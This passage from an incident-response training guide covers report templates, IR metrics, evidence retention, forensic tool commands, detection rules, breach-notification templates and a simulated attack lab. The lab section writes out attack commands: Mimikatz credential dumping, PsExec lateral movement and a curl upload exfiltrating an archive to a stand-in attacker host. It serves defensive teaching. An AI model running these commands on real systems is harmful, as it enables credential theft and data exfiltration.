  - Attribution: [if determined, confidence level]

TECHNICAL TIMELINE
  [UTC timestamps, chronological, factual]
  YYYY-MM-DD HH:MM:SS - [Event description] [Evidence source]
  ...

ANALYSIS
  - Attack vector and initial access
  - Privilege escalation path
  - Lateral movement activity
  - Persistence mechanisms
  - Data access and exfiltration
  - Tools and malware used (with hashes)

RESPONSE ACTIONS
  - Containment measures taken
  - Eradication steps
  - Recovery procedures
  - Communication actions

IMPACT ASSESSMENT
  - Data impact (classification, volume, subjects affected)
  - Operational impact (downtime, degraded service)
  - Financial impact (estimated or actual)
  - Regulatory impact (notification obligations met)
  - Reputational impact

RECOMMENDATIONS
  - Immediate (0-30 days)
  - Short-term (30-90 days)
  - Long-term (90-365 days)
  Each with: priority, estimated effort, owner

APPENDICES
  - IOCs (hashes, IPs, domains)
  - Forensic evidence inventory
  - Communication log
  - Regulatory notifications sent
```

### 9.4 Metrics

Track these metrics to measure and improve IR effectiveness:

| Metric | Definition | Target | How to Measure |
|--------|-----------|--------|----------------|
| **MTTD** | Mean Time to Detect — time from compromise to detection | <24h for P1 | First evidence timestamp → first detection alert |
| **MTTR** | Mean Time to Respond — detection to containment | <4h for P1 | Detection → confirmed containment |
| **MTTE** | Mean Time to Eradicate — containment to clean | <72h for P1 | Containment → all persistence removed |
| **Incidents/month** | Volume trend by category | Trending down | Ticket system data |
| **False positive rate** | FP/(FP+TP) for alerts | <30% | SOC classification data |
| **Escalation accuracy** | Correct severity at first classification | >80% | Compare initial vs. final severity |
| **Playbook adherence** | Steps followed / steps defined | >90% | Post-incident review |
| **Recurring incidents** | Same root cause appearing again | 0 after fix | Compare root causes across incidents |
| **Tabletop frequency** | Exercises conducted per quarter | ≥1 | Calendar records |
| **Playbook currency** | Playbooks updated in last 6 months | 100% | Document review dates |

### 9.5 Process Improvement Cycle

```
┌─────────────────────────────────────────────────────────────────────┐
│                    IR CONTINUOUS IMPROVEMENT                          │
│                                                                      │
│   ┌─────────┐    ┌─────────┐    ┌──────────┐    ┌─────────────┐   │
│   │ Measure ├───►│ Analyze ├───►│ Improve  ├───►│  Validate   │   │
│   │         │    │         │    │          │    │             │   │
│   │Collect  │    │Identify │    │Update    │    │Tabletop     │   │
│   │metrics  │    │gaps and │    │playbooks,│    │exercise,    │   │
│   │from each│    │patterns │    │tools,    │    │purple team, │   │
│   │incident │    │across   │    │training  │    │verify       │   │
│   │         │    │incidents│    │          │    │improvement  │   │
│   └─────────┘    └─────────┘    └──────────┘    └──────┬──────┘   │
│        ▲                                                │          │
│        └────────────────────────────────────────────────┘          │
└─────────────────────────────────────────────────────────────────────┘
```

**Improvement categories:**

| Category | Example Improvements |
|----------|---------------------|
| Detection | New SIEM rules, additional log sources, tuned thresholds |
| Process | Updated playbooks, clearer escalation criteria, better templates |
| Tools | New forensic capabilities, automation scripts, SOAR playbooks |
| Training | Targeted training based on gaps identified, cross-training |
| Architecture | Network segmentation, zero trust components, monitoring coverage |
| Communication | Better templates, tested channels, clearer ownership |

### 9.6 Evidence Retention and Disposal

| Evidence Type | Retention Period | Justification | Disposal Method |
|---------------|-----------------|---------------|-----------------|
| Forensic images | Minimum 3 years, or per litigation hold | Statute of limitations, ongoing legal | Cryptographic erasure or physical destruction |
| Memory dumps | 1 year after case closure | Analysis reference | Secure deletion (NIST 800-88) |
| Network captures | 90 days post-case unless litigation | Storage cost vs. value | Secure deletion |
| IR reports | 7 years | Regulatory, audit, pattern analysis | Controlled archive |
| Log data | Per policy (90-365 days typical) | Detection and hunting | Automatic lifecycle |
| Chain of custody docs | Same as associated evidence | Legal requirement | Archive with evidence |

**Disposal procedure:**
1. Confirm no active litigation hold
2. Confirm retention period satisfied
3. Document destruction decision (who, why, when)
4. Execute secure deletion (NIST SP 800-88 Clear/Purge/Destroy)
5. Verify destruction (read-back verification or physical audit)
6. Update evidence inventory

---

## 10. Laboratorio

### 10.1 Scenario: Multi-Stage Attack Simulation

**Scenario overview:**
Simulate a realistic attack chain that exercises the full IR lifecycle:

```
ATTACK CHAIN
=============
Stage 1: Initial Access (Phishing)
  → Spearphishing email with malicious Office document
  → Macro executes PowerShell stager

Stage 2: Credential Theft
  → Mimikatz execution for credential dumping
  → Pass-the-hash to service accounts

Stage 3: Lateral Movement
  → PsExec/WMI to file servers
  → RDP to database servers
  → Persistence via scheduled tasks

Stage 4: Data Exfiltration
  → Staging data in temp directory
  → Compression with password-protected archive
  → Upload to attacker-controlled cloud storage via HTTPS
```

### 10.2 Lab Environment Setup

**Minimum lab requirements:**

```
Network: Isolated VLAN (no internet egress or configure controlled egress)

Systems:
  - 1× Domain Controller (Windows Server 2019/2022)
  - 1× File Server with sample data (Windows Server)
  - 2× Workstations (Windows 10/11, joined to domain)
  - 1× Linux server (simulated web/DB server)
  - 1× Attacker system (Kali Linux)
  - 1× SIEM (Security Onion or ELK stack)
  - 1× Forensic workstation (SIFT Workstation or similar)

Pre-configured:
  - Active Directory with realistic OU structure
  - Group policies enabling PowerShell logging (4104, 4103)
  - Sysmon deployed on all Windows systems
  - Windows event forwarding to SIEM
  - Sample data on file server (fake PII for classification exercise)
  - Zeek or Suricata monitoring network traffic
```

### 10.3 Exercise Execution — Phase 1: Attack Simulation

The red team (or exercise coordinator) executes the attack chain:

```bash
# Stage 1: Simulate phishing — deliver payload to workstation
# (In lab: manually execute macro equivalent)
powershell -enc [Base64-encoded stager]

# Stage 2: Credential harvesting
# (Simulated Mimikatz — use SafetyKatz or similar for lab)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Stage 3: Lateral movement
# PsExec to file server
psexec \\fileserver01 -u domain\svc_backup -p [harvested_cred] cmd.exe

# Stage 4: Data staging and exfiltration
# On file server:
mkdir C:\Windows\Temp\staging
xcopy \\fileserver01\shares\HR\* C:\Windows\Temp\staging /s /e
7z a -p"Password123" C:\Windows\Temp\export.7z C:\Windows\Temp\staging\*

# Simulated exfiltration (curl to attacker-controlled endpoint)
curl -X POST -F "file=@C:\Windows\Temp\export.7z" https://attacker.lab/upload
```

### 10.4 Exercise Execution — Phase 2: Detection and Response

The blue team detects and responds using the playbooks documented above:

**Detection triggers (what SIEM should fire on):**

```spl
# Splunk — Detect PowerShell encoded commands (Stage 1)
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
  EventCode=4104 ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64String*"
| stats count by host, UserName, ScriptBlockText

# Splunk — Detect Mimikatz indicators (Stage 2)
index=windows EventCode=10
  TargetImage="*lsass.exe" GrantedAccess="0x1010" OR GrantedAccess="0x1410"
| stats count by host, SourceImage, TargetImage

# Splunk — Detect lateral movement (Stage 3)
index=windows EventCode=4624 LogonType=3
  TargetUserName!="*$"
| stats dc(Workstation) as unique_targets by TargetUserName, IpAddress
| where unique_targets > 3

# Splunk — Detect staging/exfiltration (Stage 4)
index=windows EventCode=11 TargetFilename="*\\Temp\\*.7z"
| stats count by host, TargetFilename, Image
```

**Response actions (blue team exercises):**

```
□ Detect initial alert (SOC analyst role)
□ Perform initial triage using decision tree (Section 3.2)
□ Classify severity (should escalate to P1 when scope clear)
□ Activate IC and war room
□ Execute containment steps (Section 4.2 adapted)
□ Collect volatile evidence from compromised systems (Section 8.1)
□ Perform memory forensics on patient zero (Section 8.2)
□ Analyze network traffic for exfiltration scope (Section 8.4)
□ Create timeline using plaso (Section 8.5)
□ Document full attack chain using MITRE ATT&CK mapping
□ Execute eradication (remove persistence, reset credentials)
□ Recover systems from clean state
□ Draft IR report (Section 9.3 format)
□ Conduct lessons learned (Section 9.1 format)
```

### 10.5 Forensic Analysis Exercise

Using evidence collected during the simulation:

**Memory analysis tasks:**

```bash
# Task 1: Identify the malicious process
vol -f workstation01_memory.raw windows.pstree.PsTree
# Expected finding: PowerShell child of WINWORD.EXE (unusual parent)

# Task 2: Extract network connections from malicious process
vol -f workstation01_memory.raw windows.netscan.NetScan | grep [PID]
# Expected finding: Connection to attacker C2 IP

# Task 3: Detect credential dumping
vol -f workstation01_memory.raw windows.handles.Handles --pid [lsass_pid]
# Expected finding: Unusual process holding handle to LSASS

# Task 4: Extract injected code
vol -f workstation01_memory.raw windows.malfind.Malfind --dump
# Expected finding: Shellcode or reflective DLL in process memory
```

**Disk analysis tasks:**

```bash
# Task 5: Identify persistence mechanism
# Parse scheduled tasks from disk image
find /mnt/evidence -name "*.xml" -path "*/Tasks/*" -exec grep -l "exec" {} \;
# Expected finding: Scheduled task running encoded PowerShell

# Task 6: Trace file access on file server
# Parse $MFT for staging directory
analyzeMFT.py -f /evidence/\$MFT -o case001_mft.csv
grep -i "staging" case001_mft.csv
# Expected finding: Timestamps of file copy operations

# Task 7: Identify exfiltrated data volume
# Parse USN Journal
usnjrnl_parse.py -f /evidence/\$UsnJrnl -o case001_usn.csv
grep -i "export.7z" case001_usn.csv
# Expected finding: Creation timestamp of archive file
```

**Network analysis tasks:**

```bash
# Task 8: Identify exfiltration
cat conn.log | zeek-cut ts uid id.orig_h id.orig_p id.resp_h id.resp_p \
  orig_bytes resp_bytes | awk -F'\t' '$7 > 10000000' | sort -t$'\t' -k7 -rn
# Expected finding: Large upload to external IP

# Task 9: Detect C2 communication pattern
cat conn.log | zeek-cut id.orig_h id.resp_h |
  sort | uniq -c | sort -rn | head -10
# Expected finding: Regular beaconing pattern to C2

# Task 10: Extract transferred files
# Use Zeek file extraction or NetworkMiner
cat files.log | zeek-cut ts filename mime_type total_bytes md5
# Expected finding: Exfiltrated archive file
```

### 10.6 IR Report Writing Exercise

Participants write a complete IR report following the template in Section 9.3.

**Grading criteria:**

| Section | Weight | Pass Criteria |
|---------|--------|---------------|
| Executive Summary | 15% | Non-technical, accurate, actionable |
| Timeline | 25% | UTC timestamps, complete chain, evidence-backed |
| Technical Analysis | 25% | ATT&CK mapping, correct tool identification, accurate scope |
| Impact Assessment | 15% | Data classification correct, regulatory obligations identified |
| Recommendations | 20% | Specific, prioritized, achievable, addresses root cause |

### 10.7 Lessons Learned Exercise

Conduct a mock lessons learned meeting:

**Discussion prompts:**

```
1. Detection: How long was the attacker present before detection?
   What could have detected them earlier?

2. Containment: Was containment fast enough? Did any containment
   action cause additional harm (data loss, business impact)?

3. Evidence: Did evidence collection procedures preserve everything
   needed? What was lost or degraded?

4. Communication: Were stakeholders informed appropriately?
   Were there communication gaps or delays?

5. Tools: Did security tools perform as expected? What gaps exist?

6. Process: Did playbooks cover this scenario adequately?
   Where did the team have to improvise?

7. Training: Where did knowledge gaps slow the response?
   What training would have helped?
```

**Expected deliverable:** Action item list with owners, deadlines, and priority rankings. Each action item must trace to a specific finding from the exercise.

---

## Appendice A — Quick Reference: Forensic Tool Commands

### FTK Imager CLI

```cmd
# Physical drive imaging (E01 format)
ftkimager \\.\PhysicalDrive0 E:\output\disk --e01 --verify --compress 6

# Logical drive imaging
ftkimager \\.\C: E:\output\c_drive --e01 --verify

# Memory capture
ftkimager --list-drives
# Note: For memory, prefer WinPmem or DumpIt (faster, less intrusive)
```

### Volatility 3 Quick Reference

```bash
# Process analysis
vol -f mem.raw windows.pslist        # Active processes
vol -f mem.raw windows.psscan        # All processes (including hidden)
vol -f mem.raw windows.pstree        # Process tree
vol -f mem.raw windows.cmdline       # Command lines

# Network
vol -f mem.raw windows.netscan       # Network connections

# Malware detection
vol -f mem.raw windows.malfind       # Injected code detection
vol -f mem.raw windows.svcscan       # Service analysis
vol -f mem.raw windows.modules       # Loaded kernel modules

# Credentials
vol -f mem.raw windows.hashdump      # SAM hashes
vol -f mem.raw windows.lsadump       # LSA secrets

# File system
vol -f mem.raw windows.filescan      # Open file handles
vol -f mem.raw windows.dumpfiles     # Extract files from memory

# Registry
vol -f mem.raw windows.registry.hivelist
vol -f mem.raw windows.registry.printkey --key "path\to\key"
```

### YARA Rule Template

```yara
rule APT_Backdoor_Example {
    meta:
        description = "Detect custom backdoor from INC-2025-042"
        author = "IR Team"
        date = "2025-05-07"
        hash = "a4b5c6d7e8f9..."
        tlp = "AMBER"

    strings:
        $mutex = "Global\\UNIQUE_MUTEX_NAME" ascii wide
        $c2_pattern = /https?:\/\/[a-z0-9]{8,12}\.(xyz|top|club)\// ascii
        $decrypt_routine = { 48 8B 44 24 ?? 48 33 C1 48 89 44 24 ?? }
        $config_marker = { 4D 5A 90 00 03 00 00 00 }

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        (2 of ($mutex, $c2_pattern, $decrypt_routine) or $config_marker)
}
```

---

## Appendice B — Communication Templates

### Template: Regulatory Breach Notification (GDPR)

```
TO: [Supervisory Authority]
FROM: [Organization DPO/Controller]
DATE: [YYYY-MM-DD]
RE: Personal Data Breach Notification (Article 33 GDPR)

1. NATURE OF BREACH:
   [Description of incident, including categories of data subjects
    and personal data affected]

2. APPROXIMATE NUMBER OF DATA SUBJECTS: [number]
   APPROXIMATE NUMBER OF RECORDS: [number]

3. CONTACT POINT:
   Name: [DPO name]
   Email: [email]
   Phone: [phone]

4. LIKELY CONSEQUENCES:
   [Description of likely consequences for data subjects —
    identity theft risk, financial fraud, etc.]

5. MEASURES TAKEN:
   [Measures taken or proposed to address the breach, including
    measures to mitigate adverse effects]

6. ADDITIONAL INFORMATION:
   [Any other relevant details. Note if this is a preliminary
    notification with further details to follow]
```

### Template: Customer Breach Notification

```
SUBJECT: Important Security Notice — Action Required

Dear [Customer Name],

We are writing to inform you of a security incident that may have
affected your personal information.

WHAT HAPPENED:
On [date], we detected [brief description]. Our investigation
determined that [scope of access/exposure].

WHAT INFORMATION WAS INVOLVED:
[List specific data types — name, email, address, financial, etc.]

WHAT WE ARE DOING:
[Actions taken — containment, investigation, security improvements]

WHAT YOU CAN DO:
- [Specific protective actions]
- [Password change recommendation if applicable]
- [Credit monitoring enrollment instructions if offered]

FOR MORE INFORMATION:
We have established a dedicated response line:
Phone: [number]
Email: [email]
Web: [incident response page URL]

We sincerely regret this incident and are committed to protecting
your information.

[Signature]
```

---

## Appendice C — Decision Framework: Should We Pay the Ransom?

```
START
  │
  ▼
Can we recover from backups within acceptable RTO?
├── YES → DO NOT PAY. Restore from backups.
│         (Continue investigating, preserve evidence)
└── NO ──▼

Is the threat actor on OFAC sanctions list?
├── YES → DO NOT PAY. Payment is illegal.
│         (Engage legal, notify law enforcement)
└── NO / UNKNOWN ──▼

Is a free decryptor available? (Check NoMoreRansom, ID Ransomware)
├── YES → DO NOT PAY. Use free decryptor.
└── NO ──▼

Does cyber insurance cover ransom payment?
├── YES → Engage insurer's IR firm and negotiator
│         (Insurer often has payment infrastructure)
└── NO ──▼

Is the business impact existential (company survival at stake)?
├── NO  → DO NOT PAY. Accept loss, rebuild.
│         (Cost of payment + reputation > recovery cost)
└── YES ──▼

Has law enforcement been notified?
├── NO  → Notify FBI/IC3 or national equivalent FIRST
└── YES ──▼

Engage professional ransomware negotiator
  - Negotiate reduction (typically 30-60% achievable)
  - Demand proof of decryption (test files)
  - Require proof of data deletion (if exfiltration claimed)
  - Document everything for insurance and legal

PROCEED WITH PAYMENT ONLY IF:
  □ Legal counsel approves
  □ Insurance carrier approves (if covered)
  □ Law enforcement does not object
  □ Sanctions check completed (OFAC, EU, UN)
  □ Payment method arranged (usually Bitcoin, requires exchange account)
  □ Incident fully documented regardless of payment outcome
```

---

## Appendice D — SIEM Detection Rules Summary

### Ransomware Indicators

```yaml
# Sigma rule — Ransomware encryption behavior
title: Mass File Rename Indicative of Ransomware
status: production
logsource:
  product: windows
  service: sysmon
  category: file_event
detection:
  selection:
    EventID: 11
  timeframe: 5m
  condition: selection | count(TargetFilename) by Computer > 200
level: critical
tags:
  - attack.impact
  - attack.t1486
```

### Lateral Movement

```yaml
# Sigma rule — PsExec lateral movement
title: PsExec Service Installation
status: production
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ServiceName: 'PSEXESVC'
  condition: selection
level: high
tags:
  - attack.lateral_movement
  - attack.t1021.002
```

### Data Exfiltration

```yaml
# Sigma rule — Large outbound transfer
title: Abnormal Outbound Data Transfer
status: production
logsource:
  category: firewall
detection:
  selection:
    action: allowed
    direction: outbound
  filter:
    dst_ip|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
  condition: selection and not filter | sum(bytes) by src_ip > 1073741824
  timeframe: 1h
level: high
tags:
  - attack.exfiltration
  - attack.t1048
```

---

## Appendice E — Incident Severity Matrix

```
                    ┌─────────────────────────────────────────────┐
                    │           IMPACT                             │
                    │   Low      Medium      High      Critical   │
   ┌────────────────┼─────────────────────────────────────────────┤
   │ Widespread     │   P3        P2         P1         P1       │
   │ (>50% users)   │                                            │
U  ├────────────────┼─────────────────────────────────────────────┤
R  │ Significant    │   P4        P3         P2         P1       │
G  │ (dept/team)    │                                            │
E  ├────────────────┼─────────────────────────────────────────────┤
N  │ Limited        │   P4        P4         P3         P2       │
C  │ (few users)    │                                            │
Y  ├────────────────┼─────────────────────────────────────────────┤
   │ Minimal        │   P4        P4         P4         P3       │
   │ (single user)  │                                            │
   └────────────────┴─────────────────────────────────────────────┘

IMPACT considers: data sensitivity, financial loss, regulatory exposure,
                  safety risk, reputational damage

URGENCY considers: number of affected users/systems, availability of
                   workaround, business-critical timing
```

---

## Riferimenti e Risorse

### Standards and Frameworks
- NIST SP 800-61r2 — Computer Security Incident Handling Guide
- NIST SP 800-86 — Guide to Integrating Forensic Techniques into IR
- NIST SP 800-88r1 — Guidelines for Media Sanitization
- ISO/IEC 27035:2023 — Information Security Incident Management
- FIRST CSIRT Services Framework v2.1
- RFC 3227 — Guidelines for Evidence Collection and Archiving
- SANS Incident Handler's Handbook

### Tools Reference
- Volatility 3: https://github.com/volatilityfoundation/volatility3
- Autopsy: https://www.autopsy.com/
- Plaso/log2timeline: https://github.com/log2timeline/plaso
- Eric Zimmerman's Tools: https://ericzimmerman.github.io/
- CAINE (forensic Linux): https://www.caine-live.net/
- Zeek: https://zeek.org/
- YARA: https://virustotal.github.io/yara/
- CyberChef: https://gchq.github.io/CyberChef/
- NoMoreRansom: https://www.nomoreransom.org/
- MITRE ATT&CK: https://attack.mitre.org/
- Sigma rules: https://github.com/SigmaHQ/sigma

### Certifications (IR/DFIR focus)
- GIAC GCIH — Certified Incident Handler
- GIAC GCFA — Certified Forensic Analyst
- GIAC GNFA — Network Forensic Analyst
- GIAC GREM — Reverse Engineering Malware
- EnCE — EnCase Certified Examiner
- CHFI — Computer Hacking Forensic Investigator (EC-Council)
- OSCP — Offensive Security (understand attacker perspective)
